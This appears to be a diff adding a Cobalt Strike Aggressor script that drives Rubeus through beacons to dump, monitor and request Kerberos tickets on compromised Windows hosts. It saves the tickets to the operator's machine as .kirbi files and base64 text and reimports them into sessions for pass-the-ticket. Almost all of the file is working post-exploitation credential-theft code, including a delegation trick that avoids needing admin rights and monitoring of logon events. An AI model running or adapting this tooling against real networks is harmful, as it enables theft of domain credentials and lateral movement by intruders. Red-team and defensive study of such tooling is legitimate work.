@@ -1,0 +1,460 @@
+$RUBEUSLOCATION = "/opt/Rubeus.exe"; # location of Rubeus
+$TICKETSFILEPATH = "/opt/tickets";  # location to store saved kerberos tickets
+
+global('$lastTicket');
+$lastTicket = $TICKETSFILEPATH;
+
+alias saveTGTall {
+    if ( -isadmin $1 )
+    {
+        bexecute_assembly($1, $RUBEUSLOCATION, "dump /service:krbtgt");
+    }
+    else
+    {
+        btask($1, "ERROR: This command requires administrative privileges");
+        btask($1, "NOTE: recommended using saveTGTdeleg when in medium integrity");
+    }
+}
+
+alias saveTGTdeleg {
+    bexecute_assembly($1, $RUBEUSLOCATION, "tgtdeleg");
+}
+
+alias loadTickets {
+    $bid = $1;
+    $defaultDir = $lastTicket;
+
+    prompt_file_open("Select kerberos ticket(s) to restore", $defaultDir, true, {
+        brev2self($bid);
+        bkerberos_ticket_purge($bid);
+        importTickets($1, $bid);
+    } );
+}
+
+alias monitorTGT {
+    if ( -isadmin $1 )
+    {
+        bexecute_assembly($1, $RUBEUSLOCATION, "monitor /interval:1");
+    }
+    else
+    {
+        btask($1, "ERROR: This command requires administrative privileges");
+        btask($1, "NOTE: recommended only using this command as SYSTEM");
+    }
+}
+
+sub importTickets {
+    @tickets = split(',', $1);
+    $bid = $2;
+
+    foreach $ticket (@tickets) 
+    {
+        bkerberos_ticket_use($bid, $ticket);
+    }
+}
+
+sub trimString {
+    $string = $1;
+    $string = replace($string, "\r", "");
+    $string = replace($string, "\n", "");
+    $string = replace($string, " ", "");
+    
+    return $string;
+}
+
+sub getDirectory {
+    $currentDay = formatDate("yyyyMMdd");
+    $saveDirectory = "$TICKETSFILEPATH\/$currentDay";
+
+    if (-exists "$saveDirectory")
+    {
+        return $saveDirectory;
+    }
+    else
+    {
+        mkdir("$saveDirectory");
+            if (-exists "$saveDirectory")
+            {
+                return $saveDirectory;
+            }
+    }
+    return "/tmp";
+}
+
+# extract string based on static patterns
+sub grabParam {
+    $string = $1;
+    $startPattern = $2;
+    $endPattern = $3;
+
+    $stringStart = indexOf($string, $startPattern);
+    $stringEnd =  indexOf($string, $endPattern);
+    if ( ($stringStart is $null) || ($stringEnd is $null) ) # Cobalt Strike sometimes crashes when null value is sent to substr
+    {
+        return "";
+    }
+    $param = substr($string, $stringStart + strlen($startPattern), $stringEnd);
+
+    return trimString($param);
+}
+
+sub saveBinaryTicket {
+    $filename = $1;
+    $ticketBin = $2;
+
+    $handle = openf("> $filename");
+    writeb($handle, $ticketBin);  # writeb is needed instead of println to write binary files to disk.
+    closef($handle);
+
+    $lastTicket = $filename;
+    btask($bid, "Raw binary ticket has been saved at: $filename");
+}
+
+sub saveText {
+    $filename = $1;
+    $text = $2;
+
+    $handle = openf(">> $filename");
+    println($handle, $text);
+    closef($handle);
+}
+
+sub parseRubeusDump {
+    $bid = $1;
+    $kerbTickets = $2;
+    $ticketStartPattern = "Base64EncodedTicket      :\r\n\r\n";
+    $ticketEndPattern = "\r\n\r\n";
+    $usernameStartPattern = "ClientName               : ";
+    $usernameEndPattern = "DomainName               : ";
+    $keyTypeStartPattern = "SessionKeyType           : ";
+    $keyTypeEndPattern = "Base64SessionKey         : ";
+    $endTimeStartPattern = "EndTime                  : ";
+    $endTimeEndPattern = "RenewUntil               : ";
+    $serviceStartPattern = "ServiceName              :";
+    $serviceEndPattern = "TargetName               :";
+    $counter = 1;
+
+    while ( $counter < 100 ) # avoid infinite loops
+    {
+        try
+        {
+            $ticketStartIndex = indexOf($kerbTickets, $ticketStartPattern);   # find start of ticket
+
+            if ( $ticketStartIndex is $null ) # stop searching if no more tickets
+            {
+                break;
+            }
+
+            # grab metadata about the ticket
+            $username = grabParam($kerbTickets, $usernameStartPattern, $usernameEndPattern);
+
+            $keyType = grabParam($kerbTickets, $keyTypeStartPattern, $keyTypeEndPattern);
+            $keyType = substr($keyType, 0, indexOf($keyType, "_"));
+
+            $endTime = grabParam($kerbTickets, $endTimeStartPattern, $endTimeEndPattern);
+            $endTime = replace($endTime, "/", "-");
+            $endTime = replace($endTime, ":", "-");
+            $endTime = replace($endTime, '(\d\d\d\d)', "\$1-");
+            
+            $serviceName = grabParam($kerbTickets, $serviceStartPattern, $serviceEndPattern);
+            $serviceName = replace($serviceName, "/", "-");
+
+            # parse out base64 encoded ticket
+            $ticketEndIndex = indexOf($kerbTickets, $ticketEndPattern, $ticketStartIndex + strlen($ticketStartPattern)); 
+
+            if ($ticketEndIndex is $null)
+            {
+                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern));
+                $counter = rand(8999) + 1000;
+            }
+            else
+            {
+                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern), $ticketEndIndex);
+            }
+
+            # format and decode ticket
+            $ticketFormatted = trimString($ticket);
+            $ticketRaw = base64_decode($ticketFormatted);
+
+            # Save ticket locally to Cobalt Strike operator's host
+            $filename = getDirectory();
+            $filename = $filename . "/DUMP_" . $username . "_" . $endTime . "_" . $keyType . "_" . $serviceName . "_" . $counter . ".kirbi";
+            saveBinaryTicket($filename, $ticketRaw);
+
+            # Save backup copy in base64 format to text file
+            $filename = getDirectory() . "/tickets.txt";
+            $ticketText = dstamp(ticks()) . "\nDUMP_" . $username . "_" . $endTime . "_" . $keyType . "_" . $serviceName . "_" . $counter . "\n" . $ticketFormatted . "\n"; 
+            saveText($filename, $ticketText);
+
+            $kerbTickets = substr($kerbTickets, $ticketEndIndex); # remove saved ticket from string of all tickets
+
+            $counter++; 
+        }
+        catch $message 
+        { 
+            btask($bid, "WARNING: Unable to obtain ticket\nERROR: $message");
+            println("WARNING: Unable to obtain ticket\nERROR: $message");
+            println(getStackTrace()); 
+            $counter++; 
+        }
+    }
+    if ( $counter > 1 ) 
+    {
+        btask($bid, "Base64 kirbi blob(s) has been saved at: $filename");
+    }
+}
+
+sub parseRubeusCatchAll {
+    $bid = $1;
+    $kerbTickets = $2;
+    $source = $3;
+    $ticketStartPattern = "[*] base64(ticket.kirbi):\r\n\r\n";
+    $ticketEndPattern = "\r\n\r\n";
+    $counter = 1;
+
+    if ($source eq "RENEW")
+    {
+        $serviceName = grabParam($kerbTickets , "Building TGS-REQ renewal for: ", "\r\n[+]");
+        $serviceName = replace($serviceName, "\\\\", "-");
+        $serviceName = replace($serviceName, "\'", "");
+        $ts = dstamp(ticks());
+        $ts = replace($ts, "/", "-");
+        $ts = replace($ts, ":", "-");
+        $ts = replace($ts, " ", "_");
+        $ticketSource = "RENEW_" . $ts . "_" . $serviceName;
+    }
+    else if ($source eq "TGTDELEG")
+    {
+        $ticketSource = "DUMP_TGT_DELEGATION_";
+    }
+    else if ($source eq "UNKNOWN" )
+    {
+        $rand4digit = rand(8999) + 1000;
+        $ticketSource = "UNKNOWN_" . $rand4digit . "_";
+    }
+
+    while ( $counter < 100 ) # avoid infinite loops
+    {
+        try
+        {
+            $ticketStartIndex = indexOf($kerbTickets, $ticketStartPattern);   # find start of ticket
+
+            if ( $ticketStartIndex is $null ) # sanity check
+            {
+                break;
+            }
+
+            $ticketEndIndex = indexOf($kerbTickets, $ticketEndPattern, $ticketStartIndex + strlen($ticketStartPattern), 0); 
+            if ( $ticketEndIndex is $null ) # sometimes unknown ticket chunks are at the very end of the output, so don't have the \r\n\r\n pattern
+            {
+                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern));
+                $counter = rand(8999) + 1000; # set counter to rand 4-digit number to exit loop and add semi-uniqueness to ticket label
+            }
+            else
+            {
+                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern), $ticketEndIndex);
+            }
+
+            # format and decode ticket
+            $ticketFormatted = trimString($ticket);
+            $ticketRaw = base64_decode($ticketFormatted);
+
+            # Save ticket locally to Cobalt Strike operator's host
+            $filename = getDirectory();
+
+            $ticketDescription = binfo($bid, "user") . "_" . binfo($bid, "computer") ;
+            $ticketDescription = replace($ticketDescription, "\\*", "");
+            $ticketDescription = replace($ticketDescription, " ", "");
+
+            if ($source eq "RENEW")
+            {
+                $filename = $filename . "/" . $ticketSource . ".kirbi";
+            }
+            else
+            {
+                $filename = $filename . "/" . $ticketSource . $ticketDescription . ".kirbi";
+            }
+            saveBinaryTicket($filename, $ticketRaw)
+
+            # Save backup copy in base64 format to text file
+            $filename = getDirectory() . "/tickets.txt";
+
+            if ($source eq "RENEW")
+            {
+                $ticketText = dstamp(ticks()) . "\n" . $ticketSource . " FROM " . $ticketDescription . "\n" . $ticketFormatted . "\n";
+            }
+            else
+            {
+                $ticketText = dstamp(ticks()) . "\n" . $ticketSource . $ticketDescription . "\n" . $ticketFormatted . "\n";
+            }
+            saveText($filename, $ticketText);
+
+            $kerbTickets = substr($kerbTickets, $ticketEndIndex); # remove saved ticket from string of all tickets
+            $counter++;
+        }
+        catch $message 
+        { 
+            btask($bid, "WARNING: Unable to obtain ticket\nERROR: $message");
+            println("WARNING: Unable to obtain ticket\nERROR: $message");
+            println(getStackTrace()); 
+            $counter++;
+        }
+    }
+    if ( $counter > 1 ) 
+    {
+        btask($bid, "Base64 kirbi blob(s) has been saved at: $filename");
+    }
+}
+
+sub parseRubeusAsk {
+    $bid = $1;
+    $kerbTickets = $2;
+    $ticketStartPattern = "[*] base64(ticket.kirbi):\r\n\r\n";
+    $ticketEndPattern = "\r\n\r\n";
+    $usernameStartPattern = "UserName              : ";
+    $usernameEndPattern = "UserRealm             : ";
+    $keyTypeStartPattern = "KeyType               : ";
+    $keyTypeEndPattern = "Base64(key)           : ";
+    $endTimeStartPattern = "EndTime               : ";
+    $endTimeEndPattern = "RenewTill             : ";
+    $serviceStartPattern = "ServiceName           : ";
+    $serviceEndPattern = "ServiceRealm          : ";
+    $counter = 1;
+
+
+    while ( $counter < 100 ) # avoid infinite loops
+    {
+        try
+        {
+            $ticketStartIndex = indexOf($kerbTickets, $ticketStartPattern);   # find start of ticket
+
+            if ($ticketStartIndex is $null) # exit if there aren't any tickets found
+            {
+                break;
+            }
+
+            $ticketEndIndex = indexOf($kerbTickets, $ticketEndPattern, $ticketStartIndex + strlen($ticketStartPattern)); 
+
+            if ( $ticketEndIndex is $null ) # sometimes unknown ticket chunks are at the very end of the output, so don't have the \r\n\r\n pattern
+            {
+                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern));
+                $counter = rand(8999) + 1000; # set counter to rand 4-digit number to exit loop and add semi-uniqueness to ticket label
+            }
+            else
+            {
+                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern), $ticketEndIndex);
+            }
+
+            # format and decode ticket
+            $ticketFormatted = trimString($ticket);
+            $ticketRaw = base64_decode($ticketFormatted);
+
+            # grab metadata about the ticket
+            $metadataBlob = substr($kerbTickets, $ticketEndIndex + strlen($ticketEndPattern));
+
+            $username = grabParam($metadataBlob , $usernameStartPattern, $usernameEndPattern);
+
+            $keyType = grabParam($metadataBlob , $keyTypeStartPattern, $keyTypeEndPattern);
+            $keyType = substr($keyType, 0, indexOf($keyType, "_"));
+
+            $endTime = grabParam($metadataBlob , $endTimeStartPattern, $endTimeEndPattern);
+            $endTime = replace($endTime, "/", "-");
+            $endTime = replace($endTime, ":", "-");
+            $endTime = replace($endTime, '(\d\d\d\d)', "\$1-");
+            
+            $serviceName = grabParam($metadataBlob , $serviceStartPattern, $serviceEndPattern);
+            $serviceName = replace($serviceName, "/", "-");
+
+            # Save ticket locally to Cobalt Strike operator's host
+            $filename = getDirectory();
+            $filename = $filename . "/ASK_" . $username . "_" . $endTime . "_" . $keyType . "_" . $serviceName . "_" . $counter . ".kirbi";
+            saveBinaryTicket($filename, $ticketRaw);
+
+            # Save backup copy in base64 format to text file
+            $filename = getDirectory() . "/tickets.txt";
+            $ticketText = dstamp(ticks()) . "\nASK_" . $username . "_" . $endTime . "_" . $keyType . "_" . $serviceName . "_" . $counter . "\n" . $ticketFormatted . "\n"; 
+            saveText($filename, $ticketText);
+
+            $kerbTickets = substr($kerbTickets, $ticketEndIndex); # remove saved ticket from string of all tickets
+            $counter++; 
+        }
+        catch $message 
+        { 
+            btask($bid, "WARNING: Unable to obtain ticket\nERROR: $message");
+            println("WARNING: Unable to obtain ticket\nERROR: $message");
+            println(getStackTrace());
+            $counter++; 
+        }
+    }
+    if ( $counter > 1 ) 
+    {
+        btask($bid, "Base64 kirbi blob(s) has been saved at: $filename");
+    }
+}
+
+on beacon_output {
+    $bid = $1;
+    $checkRubeusPatternDump = "[*] Action: Dump Kerberos Ticket Data ("; # pattern to search for Rubeus dump module output
+    $checkRubeusPatternDump2 = "[+] Successfully decrypted the authenticator"; # pattern to search for Rubeus tgtdeleg module
+    $checkRubeusPatternDump3 = "  ServiceName              : krbtgt/";
+    $checkRubeusPatternAsk = "[*] Action: Ask TG"; # pattern to search for Rubeus asktgt or asktgs modules
+    $checkRubeusPatternAsk2 = "[*] Action: Service Ticket sname Substitution"; # pattern to search for Rubeus tgssub module
+    $checkRubeusPatternAsk3 = "[+] TGT renewal request successful!"; # pattern to search for Rubeus renew module
+    $checkRubeusPatternMonitor = " - 4624 logon event for "; # pattern to search for monitor module
+    $s4uPattern = "[*] Action: S4U"; # ignore tickets from Rubeus s4u module
+    $checkUnknownTicketPattern = "[*] base64(ticket.kirbi):"; # sometimes cobalt strike output is sent in unexpected chunks, epecially at sleep 0.  This pattern is to make sure ticket gets saved even if we don't know which Rubeus module it comes from.
+    $beaconOutput = replace($2, "received output:\n", "");
+
+    if ($s4uPattern isin $beaconOutput)
+    {
+        break;
+    }
+    else if ( ($checkRubeusPatternDump isin $beaconOutput) || ($checkRubeusPatternMonitor isin $beaconOutput) )
+    {
+        parseRubeusDump($bid, $beaconOutput);
+    }
+    else if ($checkRubeusPatternDump2 isin $beaconOutput) 
+    {
+        parseRubeusCatchAll($bid, $beaconOutput, "TGTDELEG");
+    }
+    else if ( ($checkRubeusPatternAsk isin $beaconOutput) ||  ($checkRubeusPatternAsk2 isin $beaconOutput) )
+    {
+        parseRubeusAsk($bid, $beaconOutput);
+    }
+    else if ($checkRubeusPatternDump3 isin $beaconOutput) 
+    {
+        parseRubeusDump($bid, $beaconOutput);
+    }
+    else if ($checkRubeusPatternAsk3 isin $beaconOutput)
+    {
+        parseRubeusCatchAll($bid, $beaconOutput, "RENEW");
+    }
+    else if ($checkUnknownTicketPattern isin $beaconOutput)
+    {
+        parseRubeusCatchAll($bid, $beaconOutput, "UNKNOWN");
+    }
+}
+
+beacon_command_register(
+    "saveTGTall", 
+    "Executes Rubeus dump function to obtain all TGTs on the host and save them to disk in .kirbi format", 
+    "Synopsis: saveTGT\n\nSaves TGTs, useful when using golden tickets that stomp over existing TGTs.\nRequires administrative access."
+);
+
+beacon_command_register(
+    "saveTGTdeleg", 
+    "Executes Rubeus tgtdeleg function to obtain TGT of current account and saves them to disk in .kirbi format", 
+    "Synopsis: saveTGTdeleg\n\nSaves TGTs, useful when using golden tickets that stomp over existing TGTs.\nUses kerberos hack to avoid need for admin access :)"
+);
+
+beacon_command_register(
+    "loadTickets", 
+    "Brings up dialog box to choose which saved Tickets (TGT or Service Ticket) to import from disk.", 
+    "Synopsis: loadTickets\n\n purges kerberos tickets and reverts access token, then applies selected kerberos tickets to current session."
+);
+
+beacon_command_register(
+    "monitorTGT", 
+    "Executes Rubeus to monitor for new TGTs and saves them to disk in .kirbi format", 
+    "Synopsis: monitorTGT\n\nmonitors logon events and dumps TGTs, useful when on host with unconstrained delegation.\nRequires administrative access."
+);
